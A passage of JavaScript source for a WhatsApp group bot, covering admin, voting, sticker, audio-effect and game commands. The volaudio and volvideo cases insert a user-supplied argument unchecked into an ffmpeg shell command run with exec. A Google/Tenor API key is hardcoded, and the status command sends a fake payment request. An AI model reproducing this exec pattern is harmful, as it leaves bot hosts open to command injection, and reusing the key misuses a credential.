      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await EliteProEmpire.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 reply(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return reply("This command is for group use only.")
 if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
 if (!isBotAdmins) return reply("Bot needs admin privileges.")
  const xeondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xeondemoteall) {
 await EliteProEmpire.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 reply(`Success`);
}
break
            case 'hidetag':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                EliteProEmpire.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (!isAdmins) return reply(mess.admin)
                if (!m.quoted) return reply(`Reply media with caption ${prefix + command}`)
                EliteProEmpire.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'gc':
            case 'group':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (args[0] === 'close') {
                    await EliteProEmpire.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Closing Group Chat`))
                } else if (args[0] === 'open') {
                    await EliteProEmpire.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Opening Group Chat`))
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            break
            case 'editinfo':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (args[0] === 'open') {
                    await EliteProEmpire.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await EliteProEmpire.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Edit Group Info`))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
if (!m.isGroup) return reply("This command is for group use only.");
if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.");
if (!isBotAdmins) return reply("Bot needs admin privileges.");

let response = await EliteProEmpire.groupInviteCode(m.chat);
let groupLink = `https://chat.whatsapp.com/${response}`;
let profilePicUrl;

try {
  profilePicUrl = await EliteProEmpire.profilePictureUrl(m.chat, 'image');
} catch (err) {
  profilePicUrl = 'https://telegra.ph/file/7ad44b43e2b10a1d3a848.jpg'; // Default image if no profile pic found
}

let caption = `👥 *GROUP INVITATION LINK*\n📛 *Name:* ${groupMetadata.subject}\n👤 *Owner:* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID:* ${groupMetadata.id}\n👥 *Members:* ${groupMetadata.participants.length}\n🔗 *Chat Link:* ${groupLink}`;

EliteProEmpire.sendMessage(m.chat, {
  text: caption,
  contextInfo: {
    externalAdReply: {
      showAdAttribution: true, // Enables a full-screen preview
      mediaType: 1, // Image type
      thumbnailUrl: profilePicUrl, // Uses the group profile picture as thumbnail
      sourceUrl: wagc, // Clickable link
      title: groupMetadata.subject,
      body: "Join our group now!",
      renderLargerThumbnail: true // Makes thumbnail full-screen
    }
  }
}, { detectLink: true })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await EliteProEmpire.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await EliteProEmpire.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return reply("This command is for group use only.")
            if (m.chat in vote) return reply(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return reply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            EliteProEmpire.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply("This command is for group use only.")
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            EliteProEmpire.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return reply("This command is for group use only.")
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            EliteProEmpire.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return reply("This command is for group use only.")
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${EliteProEmpire.user.id}
`
EliteProEmpire.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply("This command is for group use only.")
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                await EliteProEmpire.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`Reset Success`)
                    })
            break
                //bot status
            case 'botstatus': case 'statusbot': case 'elite-pro-v2' : {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

*👨‍💻 ELITE-PRO-V2 INFO*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	EliteProEmpire.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
case 'repo': case 'repository': {
  await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️", key: m.key } })
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    
    if (response.status === 200) {
      const repoData = response.data
      const lastUpdated = new Date(repoData.updated_at).toLocaleString() // Format the last updated date
      
      const formattedInfo = `
${themeemoji} *Repository Name:* ${repoData.name}
${themeemoji} *Description:* ${repoData.description || 'No description provided'}
${themeemoji} *Owner:* ${repoData.owner.login}
${themeemoji} *Stars:* ${repoData.stargazers_count}
${themeemoji} *Forks:* ${repoData.forks_count}
${themeemoji} *Last Updated:* ${lastUpdated}
🔗 *URL:* ${repoData.html_url}
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`.trim()
      
      await EliteProEmpire.sendMessage(m.chat, {
        text: formattedInfo,
        contextInfo: {
          externalAdReply: {
            title: repoData.name,
            body: repoData.description || "GitHub Repository",
            thumbnailUrl: `https://opengraph.githubassets.com/1/${username}/${repoName}`, // Repository preview as thumbnail
            sourceUrl: repoData.html_url,
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true
          }
        }
      })
    } else {
      await reply(`Unable to fetch repository information.`)
    }
  } catch (error) {
    console.error(error)
    await reply(`Repository currently not available.`)
  }
  break; // **Ensuring the case execution stops here**
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                await EliteProEmpire.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                reply(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                reply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) EliteProEmpire.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) EliteProEmpire.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
                break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nBuy me Coffee ☕ https://i.ibb.co/Y3cv9z7/20240917-072306.jpg`
sendEliteProEmpireMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "ELITE-PRO-V2",
newsletterJid: "120363287352245413@newsletter",},
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./EliteProMedia/theme/elitepro.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'owner': {
  EliteProEmpire.sendMessage(from, {
    contacts: {
      displayName: `${list.length} Contact`,
      contacts: list
    }
  }, {
    quoted: m
  })
}
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await EliteProEmpire.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await EliteProEmpire.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
EliteProEmpire.downloadAndSaveMediaMessage(quoted, "gifee")
EliteProEmpire.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await EliteProEmpire.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await EliteProEmpire.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    EliteProEmpire.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await EliteProEmpire.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                EliteProEmpire.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                EliteProEmpire.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `elitepro.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter.js')
                let audio = await toPTT(media, 'mp4')
                EliteProEmpire.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await XeonStickWait()
                let media = await EliteProEmpire.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await EliteProEmpire.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await XeonStickWait()
                let media = await EliteProEmpire.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
                await XeonStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await EliteProEmpire.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return reply(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await EliteProEmpire.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return reply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                    EliteProEmpire.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                    EliteProEmpire.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                   EliteProEmpire.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return reply(`Example:\n${prefix}fliptext elitepro`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return reply(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await EliteProEmpire.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
EliteProEmpire.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
EliteProEmpire.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await XeonStickWait()
                let media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                EliteProEmpire.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
reply(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe.js")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    reply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await EliteProEmpire.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await EliteProEmpire.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        EliteProEmpire.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        reply(`Session TicTacToe🎮 tidak ada`)
                    } else reply('?')
                } catch (e) {
                    reply('rusak')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return reply(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
